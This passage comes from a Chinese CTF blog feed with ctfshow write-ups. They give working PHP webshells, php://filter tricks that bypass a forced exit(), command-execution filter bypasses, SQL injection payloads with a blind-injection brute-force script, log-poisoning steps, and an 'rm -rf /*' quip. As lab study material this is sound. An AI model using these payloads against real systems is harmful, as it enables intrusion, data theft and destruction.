punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>可以猜测到为 flag 的输出</p>\n<p>故需要进入 <code>sub_4015BD</code>  判断里，从而运行输出 flag 的函数</p>\n<p>利用 IDA，找到要修改的汇编语句，Edit -&gt; Patch program -&gt; Assemble,</p>\n<p>由于 Str [1] = \"b\" (由语句 <code>.data:00403020 Str             db 'dba54edb0?d6&gt;7??3ef0f1caf2ad3102',0</code>  获知)</p>\n<p>故要通过判断，则应该与 \"b\" 相比</p>\n<pre><code class=\"language-assembly\">.text:004015CA                 cmp     al, 1\n;修改为\n.text:004015CA                 cmp     al, 62h ; 'b'\n</code></pre>\n<p>修改好后，Edit -&gt; Patch program -&gt; Apply patches to input file</p>\n<p>之后运行覆盖的 <code>exe</code>  文件，得到 flag</p>\n<p><code>cef23bce78c190884ba7a6dfa5fc4675</code></p>\n<p>即 <code>flag{cef23bce78c190884ba7a6dfa5fc4675}</code></p>\n",
            "tags": [
                "CTF",
                "ctfshow",
                "Web"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/25b29fe5/",
            "url": "http://dpm12345.cn/posts/25b29fe5/",
            "title": "新春欢乐赛_2022",
            "date_published": "2022-10-04T03:07:26.000Z",
            "content_html": "<h1 id=\"热身\"><a href=\"#热身\" class=\"headerlink\" title=\"热身\"></a>热身</h1><p>开局看到源码，但是却没有显示源码的代码。那么只能是被包含进去了，直接 phpinfo 搜 append 可以看到包含的文件，查看之得到 flag </p>\n<p>涉及到：<code>phpinfo()</code>,<code>append </code></p>\n<p><strong>phpinfo():</strong> 输出 PHP 当前状态的大量信息，包含了 PHP 编译选项、启用的扩展、PHP 版本、服务器信息和环境变量（如果编译为一个模块的话）、PHP 环境变量、操作系统版本信息、path 变量、配置选项的本地值和主值、HTTP 头和 PHP 授权信息 (License)。</p>\n<h1 id=\"Web-1\"><a href=\"#Web-1\" class=\"headerlink\" title=\"Web 1\"></a>Web 1</h1><p>对 <code>file_put_contents($content,'&lt;?php exit();'.$content);</code>的绕过</p>\n<p>在这里，由于将 <code>exit();</code> 写入了文件，那么即使成功传入一句话木马，也无法执行，那么需要绕过 <code>exit()</code></p>\n<h2 id=\"绕过方法\"><a href=\"#绕过方法\" class=\"headerlink\" title=\"绕过方法\"></a>绕过方法</h2><h3 id=\"Round-1\"><a href=\"#Round-1\" class=\"headerlink\" title=\"Round 1\"></a>Round 1</h3><pre><code class=\"php\">&lt;?php\n$content = '&lt;?php exit; ?&gt;';\n$content .= $_POST['txt'];\nfile_put_contents($_POST['filename'], $content);\n</code></pre>\n<p><code>$content</code> 在开头增加了 <code>exit</code> 过程，导致即使我们成功写入一句话，也执行不了。幸运的是，这里的</p>\n<p><code>$_POST['filename']</code> 是可以控制协议的，我们即可使用 <code>php://filter</code> 协议来施展魔法</p>\n<h4 id=\"方法一、base64-编码\"><a href=\"#方法一、base64-编码\" class=\"headerlink\" title=\"方法一、base64 编码\"></a>方法一、base64 编码</h4><p>使用<code>php://filter</code>流的<code>base64-decode</code>方法，将<code>$content</code>解码，利用<code>php base64_decode </code>函数特性去除 “死亡 exit”。</p>\n<p>众所周知，base64编码中只包含64个可打印字符<code>（A-Z a-z 0-9 + /）'='</code> 补位，而 PHP 在解码 base64 时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p>\n<p>所以，当<code>$content</code>被加上了<code>&lt;?php exit;?&gt;</code>后，我们可以使用<code>php://filter/write=convert.base64-decode</code>来首先对其解码。在解码的过程中，字符<code> &lt;、?、;、&gt;、空格</code>等一共有 7 个字符不符合 base64 编码的字符范围将被忽略，所以最终被解码的字符仅有 “phpexit” 和我们传入的其他字符。</p>\n<p>“phpexit” 一共 7 个字符，<strong>因为 base64 算法解码时是4个byte一组</strong>，所以给他增加1个“a”一共 8 个字符。这样，”phpexita” 被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是  没有了。</p>\n<p>最终效果:</p>\n<p><img data-src=\"https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200406235335043-1930261389.png\"></p>\n<h4 id=\"方法二、利用字符串操作方法-base64-组合拳\"><a href=\"#方法二、利用字符串操作方法-base64-组合拳\" class=\"headerlink\" title=\"方法二、利用字符串操作方法 + base64 组合拳\"></a>方法二、利用字符串操作方法 + base64 组合拳</h4><p>除了使用base64特性的方法外，我们还可以利用<code>php://filter</code>字符串处理方法来去除“死亡 exit”。我们观察一下，这个<code>&lt;?php exit; ?&gt;</code>实际上是什么？</p>\n<p>这实际上是一个 XML 标签，既然是 XML 标签，我们就可以利用 strip_tags 函数去除它，而 php://filter 刚好是支持这个方法的。</p>\n<p>编写如下测试代码即可查看<code>php://filter/read=string.strip_tags/resource=php://input</code>的效果：</p>\n<pre><code class=\"php\">echo readfile('php://filter/read=string.strip_tags/resource=php://input');\n</code></pre>\n<p><img data-src=\"https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200406234627327-1601681134.png\"></p>\n<p>可见，<code>?php exit; ?&gt;</code>被去除了。但回到上面的题目，我们最终的目的是写入一个webshell，而写入的webshell也是php代码，如果使用<code>strip_tags</code>同样会被去除。</p>\n<p>万幸的是，<code>php://filter</code>允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成<code>strip_tags</code>后再进行<code>base64-decode</code>。“死亡 exit” 在第一步被去除，而 webshell 在第二步被还原。</p>\n<p>最终效果：</p>\n<p><img data-src=\"/../../../post_images/%E5%9B%BE%E7%89%87/web1_3.png\"></p>\n<h4 id=\"方法三、ROT13-编码\"><a href=\"#方法三、ROT13-编码\" class=\"headerlink\" title=\"方法三、ROT13 编码\"></a>方法三、ROT13 编码</h4><p>原理和上面类似，核心是将 “死亡 exit” 去除。<code>&lt;?php exit; ?&gt;</code>在经过 rot13 编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code></p>\n<p>在PHP不开启<code>short_open_tag</code> 时，php 不认识这个字符串，当然也就不会执行了</p>\n<p><img data-src=\"/../../../post_images/%E5%9B%BE%E7%89%87/web1_4.png\"></p>\n<h3 id=\"Round-2\"><a href=\"#Round-2\" class=\"headerlink\" title=\"Round 2\"></a>Round 2</h3><pre><code class=\"php\">&lt;?php\n$a = $_POST['txt'];\nfile_put_contents($a,\"&lt;?php exit();\".$a);\n</code></pre>\n<p>这种是前后两个变量相同，假设<code>$a</code>可控情况。</p>\n<p>这种相同变量的构造方式和不同变量的构造方式思路是大差不差的，都是需要干掉<code>&lt;?php exit();</code>，只不过构造起来相对更复杂一些。</p>\n<h4 id=\"方法一、base64-编码-1\"><a href=\"#方法一、base64-编码-1\" class=\"headerlink\" title=\"方法一、base64 编码\"></a>方法一、base64 编码</h4><p>根据前面介绍的不同变量的构造方法，很容易拓展到相同的变量，同样利用<code>php://filter</code>来构造，反正后面是写入的内容，只要在后面解码的时候把 shell 解码出来，不需要的东西解码成乱码即可，而 Base64 构造的话，例如</p>\n<pre><code class=\"php\">$a=php://filter/write=convert.base64-decode|PD9waHAgcGhwaW5mbygpOz8+/resource=shell.php\n\n（    &lt;?php phpinfo();?&gt;    base64编码    PD9waHAgcGhwaW5mbygpOz8+      ）\n</code></pre>\n<p>构造的 shell 可以放在过滤器的位置和文件名位置都可以（其他编码有时候会有空格什么的乱码，文件名不一定好用），<code>php://filter</code>面对不可用的规则（一串 base64）是报个 Warning，绕后跳过继续执行的（不会退出），所以按理说这样构造是 “很完美” 的。我们看下<code>base-decode</code>哪些字符👇</p>\n<pre><code class=\"raw\">php://filter/write=convertbase64decodePD9waHAgcGhwaW5mbygpOz8+/resource=shell.php\n</code></pre>\n<p>而默认情况下 base64 编码是以<code>=</code>作为结尾的，所以正常解码的时候到了<code>=</code>就解码结束了，即使我们构造payload的时候不用<code>write=</code>，但是在最后获取文件名的时候<code>resource=</code>中的<code>=</code>过不掉，所以导致过滤器解码失败，从而报错…</p>\n<p>这里用 base64 编码我还没找到好的方法，待补充…</p>\n<h4 id=\"方法二、ROT13\"><a href=\"#方法二、ROT13\" class=\"headerlink\" title=\"方法二、ROT13\"></a>方法二、ROT13</h4><p>rot13 编码就不存在 base64 的问题，所以和前面 base64 构造的思路一样</p>\n<pre><code class=\"php\">$a = php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;/resource=shell.php\n</code></pre>\n<p><img data-src=\"/../../../post_images/%E5%9B%BE%E7%89%87/web1_5.png\"></p>\n<p>和前面提到的一样，这种方法是需要服务器没有开启短标签的时候才可以使用(默认情况是没开启的：<code>php.ini</code>中的<code>short_open_tag</code>)</p>\n<h4 id=\"方法三、iconv-字符编码转换\"><a href=\"#方法三、iconv-字符编码转换\" class=\"headerlink\" title=\"方法三、iconv 字符编码转换\"></a>方法三、iconv 字符编码转换</h4><p>通过字符转换把<code>&lt;?php exit();</code>转成不能解析的，这里采用的是UCS-2或者UCS-4编码方式,而我们构造的转成可正常解析的</p>\n<pre><code class=\"php\">#echo iconv(\"UCS-2LE\",\"UCS-2BE\",'&lt;?php phpinfo();?&gt;');\n?&lt;hp phpipfn(o;)&gt;?\n</code></pre>\n<p>这里用的是 UCS-2，当然我们也可以用 UCS-4</p>\n<pre><code class=\"php\">echo iconv(\"UCS-4LE\",\"UCS-4BE\",'aa&lt;?php phpinfo();?&gt;');\n?&lt;aa phpiphp(ofn&gt;?;)\n</code></pre>\n<p>通过UCS-2或者UCS-4的方式，对目标字符串进行2/4位一反转，也就是说构造的需要是UCS-2或UCS-4中2或者4的倍数，不然不能进行反转，那我们就可以利用这种过滤器进行编码转换绕过了，构造payload</p>\n<pre><code class=\"php\">$a='php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?/resource=shell.php';\n\n**or**\n\n$a='php://filter/convert.iconv.UCS-4LE.UCS-4BE|xxx?&lt;aa phpiphp(ofn&gt;?;)/resource=shell.php';\n#由于是 4 位一反转，所以需要保证？&lt;aa phpiphp (ofn&gt;?;) 之前字符个数是 4 的倍数，所以补充了 xxx\n</code></pre>\n<p><img data-src=\"https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200407105517997-451500709.png\"></p>\n<h4 id=\"方法四、iconv-字符编码转换-ROT13-编码组合拳\"><a href=\"#方法四、iconv-字符编码转换-ROT13-编码组合拳\" class=\"headerlink\" title=\"方法四、iconv 字符编码转换 + ROT13 编码组合拳\"></a>方法四、iconv 字符编码转换 + ROT13 编码组合拳</h4><p>和前后不同的变量的利用一样，相同变量一样可以使用组合拳，原因前面描述过了，就不赘述，这里就用UCS-2和rot13举一个例子吧</p>\n<pre><code class=\"php\">$a = 'php://filter/write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13|x?&lt;uc cucvcsa(b;)&gt;?/resource=shell.php'\n#先将 &lt;?php phpinfo(); ?&gt; 进行rot13得到&lt;?cuc cucvasb();?&gt;\n#再对&lt;?cuc cucvasb();?&gt;进行UCS2编码转换得到?&lt;uc cucvcsa(b;)&gt;?\n#最后x 补位\n#最终得到x?&lt;uc cucvcsa(b;)&gt;?\n</code></pre>\n<p><img data-src=\"https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200407111602416-1849632067.png\"></p>\n<p>为何不用<code>string.strip_tags</code>呢？因为rot13转换的同样会被<code>strip_tags</code>方法给删除了，而UCS-2或UCS-4构造的也同样会被<code>strip_tags</code>方法给删除，这里需要找其他的编码方式进行构造。</p>\n<p><strong>rot13 payload:</strong> </p>\n<pre><code class=\"php\">?content=php://filter/write=string.rot13||/resource=shell.php\n</code></pre>\n<p>其中<code>&lt;?cuc @riny($_CBFG[pzq]);?&gt;</code>为<code>&lt;?php @eval($_post[cmd]);?&gt;</code>的rot13加密结果(<code>@</code>的作用为即使错误也执行)</p>\n<p>所以访问<code>shell.php</code>, 然后post传入<code>cmd=system('ls /');</code>, 查看源码发现有<code>flag.txt</code>，然后再post传入<code>cmd=system('cat /flag.txt');</code></p>\n<p>对于<code>system ('ls /')</code>，加斜杠即访问file system (或者说为根目录) 中的文件，不加斜杠即为当前目录下的文件</p>\n<h1 id=\"Web-2\"><a href=\"#Web-2\" class=\"headerlink\" title=\"Web 2\"></a>Web 2</h1><p>题目代码</p>\n<pre><code class=\"php\">highlight_file(__FILE__);\nsession_start();\nerror_reporting(0);\n\ninclude \"flag.php\";\n\nif(count($_POST)===1){\n        extract($_POST);\n        if (call_user_func($$$$$${key($_POST)})===\"HappyNewYear\"){\n                echo $flag;\n        }\n}\n?&gt;\n</code></pre>\n<p>一共涉及到了四个函数<code>count()</code>,<code>extracy()</code>,<code>call_user_func()</code>,<code>key()</code></p>\n<p>**count(): **计算数组中的单元数目，或对象中的属性个数</p>\n<p><strong>extract()</strong>: 从数组中将变量导入到当前的符号表</p>\n<p><strong>call_user_func():</strong> 第一个参数<code>callback</code>是被调用的回调函数，其余参数是回调函数的参数。返回回调函数的返回值。</p>\n<p><strong>key()</strong>: 从关联数组中取得键名</p>\n<p>post传入<code>session_id=session_id</code></p>\n<p>cookie=<code>PHPSESSID=HappyNewYear</code></p>\n<h1 id=\"Web-3\"><a href=\"#Web-3\" class=\"headerlink\" title=\"Web 3\"></a>Web 3</h1><pre><code class=\"php\">&lt;?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2022-01-16 15:42:02\n# @Last Modified by:   h1xa\n# @Last Modified time: 2022-01-24 22:14:02\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n*/\n\nhighlight_file(__FILE__);\nerror_reporting(0);\n\ninclude \"flag.php\";\n$key=  call_user_func(($_GET[1]));\n\nif($key==\"HappyNewYear\"){\n  echo $flag;\n}\n\ndie(\"虎年大吉，新春快乐！\");\n</code></pre>\n<p>弱类型比较</p>\n<p>只需解决<code>call_user_func </code>函数即可</p>\n<p>为了让后面等于，那么可以使用函数<code>session_start</code>, 返回 bool 值</p>\n<h1 id=\"Web-4\"><a href=\"#Web-4\" class=\"headerlink\" title=\"Web 4\"></a>Web 4</h1><pre><code class=\"php\">$key=  call_user_func(($_GET[1]));\nfile_put_contents($key, \"&lt;?php eval(\\$_POST[1]);?&gt;\");\n\ndie(\"虎年大吉，新春快乐！\");\n</code></pre>\n<p>1=spl_autoload_extensions</p>\n<p><img data-src=\"/../../../post_images/%E5%9B%BE%E7%89%87/d2cf6418694b28cf61e50bdb9a21519dc7a123eb.png\"></p>\n<p>注册好后，先访问<code>.inc,.php</code>, 同时post命令，<code>1=system('ls');</code>, 只回显<code>index.php</code>那么访问根目录下的文件<code>1=system('ls /');</code>看到<code>f1ag.txt</code>再输入<code>1=system('cat /f1ag.txt')</code>，得到 flag</p>\n<p><img data-src=\"/../../../post_images/%E5%9B%BE%E7%89%87/ca4ad134f882baa5980c36c06efd2c11c51ac995.png\"></p>\n",
            "tags": [
                "CTF",
                "ctfshow",
                "Web"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/7c4924dd/",
            "url": "http://dpm12345.cn/posts/7c4924dd/",
            "title": "萌新",
            "date_published": "2022-10-04T02:28:52.000Z",
            "content_html": "<p>常见的一些命令执行的语句</p>\n<pre><code class=\"raw\">system()\npassthru()\nexec()\nshell_exec()\npopen()\nproc_open()\npcntl_exec()\n</code></pre>\n<p>各种绕过姿势，总结一下</p>\n<ol>\n<li><p>构造<code>?c=$a='sys';$b='tem';$d=$a.$b;$d('cat config.php');</code></p>\n</li>\n<li><p>cat 绕过<code>?c=system('ca\"\"t config.php')</code></p>\n</li>\n<li><p>base64 绕过<code>?c=$a = base64_decode('c3lzdGVt');$b=base64_decode('Y2F0IGNvbmZpZy5waHA=');$a($b);</code></p>\n</li>\n<li><p>闭合<code>?c=assert(base64_decode(%27c3lzdGVtKCdjYXQgY29uZmlnLnBocCcp%27))?&gt;</code></p>\n</li>\n<li><p>POST 传值</p>\n<pre><code class=\"raw\">?c=echo `$_POST[1]`?&gt;\n\n?c=echo `$_POST[1]`;\n\n然后通过 post 方式传入 1=cat config.php\n</code></pre>\n</li>\n</ol>\n<h1 id=\"萌新-隐写-4\"><a href=\"#萌新-隐写-4\" class=\"headerlink\" title=\"萌新 隐写 4\"></a>萌新 隐写 4</h1><p>word 文件中的选项有隐藏文字这一选项，勾上能查看隐藏的文字</p>\n<h1 id=\"web-3\"><a href=\"#web-3\" class=\"headerlink\" title=\"web 3\"></a>web 3</h1><p>使用逻辑符绕过</p>\n<p><code>?id=10 || id=1000</code></p>\n<h1 id=\"web-4\"><a href=\"#web-4\" class=\"headerlink\" title=\"web 4\"></a>web 4</h1><p>使用字符串:<code>?id=\"1000\"</code></p>\n<h1 id=\"web-5\"><a href=\"#web-5\" class=\"headerlink\" title=\"web 5\"></a>web 5</h1><p>使用异或:<code>?id=328^672</code></p>\n<p>使用运算符绕过<code>?id=~~1000</code></p>\n<h1 id=\"web-6\"><a href=\"#web-6\" class=\"headerlink\" title=\"web 6\"></a>web 6</h1><p>使用运算符绕过<code>?id=~~1000</code></p>\n<h1 id=\"web-7\"><a href=\"#web-7\" class=\"headerlink\" title=\"web 7\"></a>web 7</h1><p>使用二进制绕过 1000 的二进制</p>\n<p>各进制的前缀</p>\n<ul>\n<li><strong>二进制：0b</strong></li>\n<li><strong>八进制：0O</strong></li>\n<li><strong>十进制：无前缀</strong></li>\n<li><strong>十六进制：0x</strong></li>\n</ul>\n<p>故构造 payload <code>?id=0b1111101000</code></p>\n<h1 id=\"web-8\"><a href=\"#web-8\" class=\"headerlink\" title=\"web 8\"></a>web 8</h1><p>梗题 </p>\n<p>弹窗中有 “熟悉的一顿操作后，去了埃塞俄比亚” </p>\n<p>去了那么远，那么极有可能是删库跑路 而删库跑路的命令为 <code>rm -rf /*</code></p>\n<h1 id=\"web-9\"><a href=\"#web-9\" class=\"headerlink\" title=\"web 9\"></a>web 9</h1><p>题目源码</p>\n<pre><code class=\"php\">&lt;?php\n# flag in config.php\ninclude(\"config.php\");\nif(isset($_GET['c'])){\n        $c = $_GET['c'];\n        if(preg_match(\"/system|exec|highlight/i\",$c)){\n                eval($c);\n        }else{\n            die(\"cmd error\");\n        }\n}else{\n        highlight_file(__FILE__);\n}\n?&gt;\n</code></pre>\n<p>即包含 <code>system</code> 或 <code>exec</code> 或 <code>highlight</code> 才会执行 <code>eval</code> 函数 </p>\n<p>而 <code>eval</code> 会将 <code>c</code> 作为 PHP 代码执行 这里只需显示 <code>config.php</code> 文件内容即可 </p>\n<p>这里用到了 <code>highlight_file()</code> 函数 <code>highlight_file(string $filename, bool $return false);</code> </p>\n<p>即代码高亮 filename 文件，若第二个参数是 <code>false</code>，则打印输出文件，若 <code>true</code>，则将其转换为字符串返回</p>\n<h1 id=\"web-10\"><a href=\"#web-10\" class=\"headerlink\" title=\"web 10\"></a>web 10</h1><p>绕过,采用字符串拼接</p>\n<p><code>?c=$a='sys';$b='tem';$d=$a.$b;$d('cat config.php');</code> 或 </p>\n<p><code>?c=$a='high';$b='light_file';$d=$a.$b;$d('config.php');</code></p>\n<h1 id=\"web-11\"><a href=\"#web-11\" class=\"headerlink\" title=\"web 11\"></a>web 11</h1><pre><code class=\"php\">&lt;?php\n# flag in config.php\ninclude(\"config.php\");\nif(isset($_GET['c'])){\n        $c = $_GET['c'];\n        if(!preg_match(\"/system|exec|highlight|cat/i\",$c)){\n                eval($c);\n        }else{\n            die(\"cmd error\");\n        }\n}else{\n        highlight_file(__FILE__);\n}\n?&gt; \n</code></pre>\n<p><code>?c=passthru(‘tac config.php’);</code></p>\n<h1 id=\"web-12\"><a href=\"#web-12\" class=\"headerlink\" title=\"web 12\"></a>web 12</h1><pre><code class=\"php\">&lt;?php\n# flag in config.php\ninclude(\"config.php\");\nif(isset($_GET['c'])){\n        $c = $_GET['c'];\n        if(!preg_match(\"/system|exec|highlight|cat|\\.|php|config/i\",$c)){\n                eval($c);\n        }else{\n            die(\"cmd error\");\n        }\n}else{\n        highlight_file(__FILE__);\n}\n?&gt; \n</code></pre>\n<p><code>?c=passthru(‘tac confi*’);</code></p>\n<p><code>?c=$a=base64_decode(‘Y29uZmlnLnBocA==’);passthru(“more $a”);</code></p>\n<h1 id=\"web-13\"><a href=\"#web-13\" class=\"headerlink\" title=\"web 13\"></a>web 13</h1><pre><code class=\"php\">&lt;?php\n# flag in config.php\ninclude(\"config.php\");\nif(isset($_GET['c'])){\n        $c = $_GET['c'];\n        if(!preg_match(\"/system|exec|highlight|cat|\\.|\\;|file|php|config/i\",$c)){\n                eval($c);\n        }else{\n            die(\"cmd error\");\n        }\n}else{\n        highlight_file(__FILE__);\n}\n?&gt;\n</code></pre>\n<p>分号被过滤了，考虑到结束符隐藏有分号，那么用结束符 <code>&gt;?</code> 代替分号</p>\n<h1 id=\"web-14\"><a href=\"#web-14\" class=\"headerlink\" title=\"web 14\"></a>web 14</h1><pre><code class=\"php\">&lt;?php\n# flag in config.php\ninclude(\"config.php\");\nif(isset($_GET['c'])){\n        $c = $_GET['c'];\n        if(!preg_match(\"/system|exec|highlight|cat|\\(|\\.|\\;|file|php|config/i\",$c)){\n                eval($c);\n        }else{\n            die(\"cmd error\");\n        }\n}else{\n        highlight_file(__FILE__);\n}\n?&gt;\n</code></pre>\n<p>源码中通过 GET 请求获取参数，并过滤了参数中的 <code>system exec highlight cat ( . ; file php config</code> 等关键字，</p>\n<p>这里有几个比较重要的点 </p>\n<ol>\n<li>过滤了括号 <code>( </code>, 函数不能用了，但仍然可以用反引号 ` 来执行系统命令 </li>\n<li>过滤了分号<code>；</code>, 可以使用<code>?&gt;</code> 来代替分号，但这样一来就只能执行一行代码，增加了解题的难度 </li>\n<li>源码中的过滤只针对 GET 请求的参数，并未对 POST 请求的参数做限制，可以利用这一点搞事情</li>\n</ol>\n<p>首先我们通过 GET 请求的参数传递一句话木马，<code>$_POST[a]</code> 接收 POST 请求传递的参数，而后反引号将接收的参数当做系统命令执行, 由于反引号执行完成后并不输出结果，而是返回一个保存执行结果的字符串类型变量，所以需要使用 <code>echo</code> 来输出这个变量，从而输出执行结果</p>\n<pre><code class=\"raw\">?c=echo `$_POST[a]`?&gt;\n</code></pre>\n<p>而后使用代理工具 (Burp Suite) 抓包，在 POST 请求中传递需要执行的系统命令，这里需要注意两个地方 ( 如果使用的是其他工具可以忽略) </p>\n<ol>\n<li>拦截的请求是 GET 请求，需要改成 POST 请求才能在请求体中传递参数 </li>\n<li>由于手动将 GET 请求改成了 POST 请求，需要再手动添加 <code>Content-Type: application/x-www-form-urlencoded</code> , 否则将无法正常发送 POST 请求的参数 <code>a=cat config.php</code></li>\n</ol>\n<p>或者直接用 Hackbar</p>\n<h1 id=\"web-15\"><a href=\"#web-15\" class=\"headerlink\" title=\"web 15\"></a>web 15</h1><pre><code class=\"php\">&lt;?php\n# flag in config.php\ninclude(\"config.php\");\nif(isset($_GET['c'])){\n        $c = $_GET['c'];\n        if(!preg_match(\"/system|\\\\*|\\?|\\&lt;|\\&gt;|\\=|exec|highlight|cat|\\(|\\.|file|php|config/i\",$c)){\n                eval($c);\n        }else{\n            die(\"cmd error\");\n        }\n}else{\n        highlight_file(__FILE__);\n}\n?&gt;\n</code></pre>\n<pre><code class=\"raw\">?c=echo $_GET[1];&amp;1=tac config.php\n</code></pre>\n<h1 id=\"web-16\"><a href=\"#web-16\" class=\"headerlink\" title=\"web 16\"></a>web 16</h1><pre><code class=\"php\">&lt;?php\n# flag in config.php\ninclude(\"config.php\");\nif(isset($_GET['c'])){\n        $c = $_GET['c'];\n        if(md5(\"ctfshow$c\")===\"a6f57ae38a22448c2f07f3f95f49c84e\"){\n            echo $flag;\n        }else{\n            echo \"nonono!\";\n        }\n}else{\n        highlight_file(__FILE__);\n}\n?&gt;\n</code></pre>\n<p>爆破</p>\n<p>代码为</p>\n<pre><code class=\"python\">import hashlib\nstr1 = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'\npayload = ''\nfor i in str1:\n    for j in str1:\n        for k in str1:\n            s = hashlib.md5(('ctfshow'+i+j+k).encode()).hexdigest()\n            # print(type(s))\n            if s == 'a6f57ae38a22448c2f07f3f95f49c84e':\n                print(i+j+k)\n</code></pre>\n<h1 id=\"web-17-x2F-18-x2F-19-x2F-20-x2F-21\"><a href=\"#web-17-x2F-18-x2F-19-x2F-20-x2F-21\" class=\"headerlink\" title=\"web 17/18/19/20/21\"></a>web 17/18/19/20/21</h1><p>17 </p>\n<p>18 过滤了 file </p>\n<p>19 过滤了 base </p>\n<p>20 过滤了 rot </p>\n<p>21 过滤了： c 传参过滤掉 php </p>\n<p>思路：</p>\n<p>include 文件包含</p>\n<p>利用日志文件包含,访问日志文件：<code>?c=/var/log/nginx/access.log</code></p>\n<p>发现日志文件记录了 <code>user-agent</code> 头，于是在该头中插入一句话木马：<code>&lt;?php eval($_POST['a']);?&gt;</code></p>\n<p>然后可使用蚁剑连接，密码即为 <code>a</code> 然后看到有 <code>36d.php</code>，打开后得到 flag</p>\n",
            "tags": [
                "CTF",
                "ctfshow",
                "Web"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/dd66f6b6/",
            "url": "http://dpm12345.cn/posts/dd66f6b6/",
            "title": "萌新赛",
            "date_published": "2022-10-03T16:10:32.000Z",
            "content_html": "<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"给他\"><a href=\"#给他\" class=\"headerlink\" title=\"给他\"></a>给他</h2><p>源码</p>\n<pre><code class=\"php\">&lt;?php \n    $pass=sprintf(\"and pass='%s'\",addslashes($_GET['pass'])); \n    $sql=sprintf(\"select * from user where name='%s' $pass\",addslashes($_GET['name'])); \n?&gt;\n</code></pre>\n<p><img data-src=\"/../../../post_images/ctfshow/%E8%90%8C%E6%96%B0%E8%B5%9B/web_%E7%BB%99%E4%BB%96.png\"></p>\n<p>payload: <code>?name=admin&amp;pass=%1$' or 1=1--+</code></p>\n<p>这里修改的原因为，%1的话连接到sql上时，%1会被解析为空，那么$‘成为新的变量，因而输出的sql为</p>\n<p><code>select * from user where name='admin' and pass='''</code></p>\n<p>那么此时如果在后面添加，比如 <code>or 1=1--+</code></p>\n<p>那么得到sql语句为<code>'select * from user where name='admin' and pass='' or 1=1-- '</code>, 也就是成立</p>\n<p>之后得到一个假的404页面</p>\n<p>查看源码，可以看到flag的位置/flag</p>\n<p>抓包，看见cookie里有file=666c61672e747874，后面内容十六进制解码后为flag.txt</p>\n<p>使用伪协议，base64，十六进制编码输入后，不行</p>\n<p>使用 rot13</p>\n<p>得到<code>PGSFUBJ{S3622181-0S53-494R-N344-7P6001S38SQ1}</code></p>\n<p>得到后rot13解码，得到flag</p>\n<h2 id=\"签到\"><a href=\"#签到\" class=\"headerlink\" title=\"签到\"></a>签到</h2><p>命令执行，不同命令间可用分号分隔，一条一条执行</p>\n<p><code>?url=a;ls;a</code></p>\n<p><code>?url=a;cat flag;a</code></p>\n<h2 id=\"假赛生\"><a href=\"#假赛生\" class=\"headerlink\" title=\"假赛生\"></a>假赛生</h2><p>根据题目，有register.php和login.php</p>\n<p>由代码，需要name=admin，于是注册 admin 的用户</p>\n<p>发现不能注册，于是在admin后加上空格，尝试使用admin登入，发现可以</p>\n<p>之后传入c的值，由正则<code>\\w 匹配字母或数字或下划线或汉字</code> </p>\n<p>可传入空值即可绕过</p>\n<p>得到flag</p>\n<h2 id=\"萌新记忆\"><a href=\"#萌新记忆\" class=\"headerlink\" title=\"萌新记忆\"></a>萌新记忆</h2><p>进入admin目录，有登陆页面，</p>\n<p>抓包，测试，</p>\n<p>经过一番尝试在没有语句错误的情况下发现有三种返回结果</p>\n<ol>\n<li>用户名/密码错误：当输入的用户名不为admin且不超过限制的长度时</li>\n<li>用户名错误：用户名长度超过限制 (字符长度最大为 20)</li>\n<li>密码错误：输入用户名为admin</li>\n<li>通过测试发现未过滤的字符有单引号 (’)、逗号（,）、括号（（））、小于号 (&lt;)、或（||）、substr ()、lift、right、length ()</li>\n</ol>\n<p>首先获取字段长度</p>\n<p><code>'||length(p)&lt;'100&amp;p=1</code></p>\n<p>当小于18返回<strong>密码错误</strong>，小于17<strong>返回用户名/密码错误</strong></p>\n<p>因此，密码字段长度为17</p>\n<p>爆破</p>\n<p>脚本为</p>\n<pre><code class=\"python\">import requests\nurl = 'http://912753e7-33da-4383-bd60-939a7885131d.challenge.ctf.show/admin/checklogin.php'\ns = '0123456789abcdefghijklmnopqrstuvwxyz'\nflag = ''\nfor i in range(1, 18):\n    print('*')\n    for j in s:\n        data = {\"u\": \"'||substr(p,\"+str(i)+\",1)&lt;'\"+j,\n                \"p\": \"1\"\n                }\n        r = requests.post(url, data=data)\n        # print(r.text)\n        if \"密码错误\" == r.text:\n            flag += chr(ord(j)-1)\n            print(flag)\n            break\n</code></pre>\n<p>得到密码<code>cptbtptpbcptdtptp</code></p>\n<p>登录得到flag</p>\n<h1 id=\"Reverse\"><a href=\"#Reverse\" class=\"headerlink\" title=\"Reverse\"></a>Reverse</h1><h2 id=\"数学不及格\"><a href=\"#数学不及格\" class=\"headerlink\" title=\"数学不及格\"></a>数学不及格</h2><p>打开</p>\n<pre><code class=\"cpp\">int __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int v4; // [rsp+14h] [rbp-4Ch]\n  char *endptr; // [rsp+18h] [rbp-48h] BYREF\n  char *v6; // [rsp+20h] [rbp-40h] BYREF\n  char *v7; // [rsp+28h] [rbp-38h] BYREF\n  char *v8; // [rsp+30h] [rbp-30h] BYREF\n  __int64 v9; // [rsp+38h] [rbp-28h]\n  __int64 v10; // [rsp+40h] [rbp-20h]\n  __int64 v11; // [rsp+48h] [rbp-18h]\n  __int64 v12; // [rsp+50h] [rbp-10h]\n  unsigned 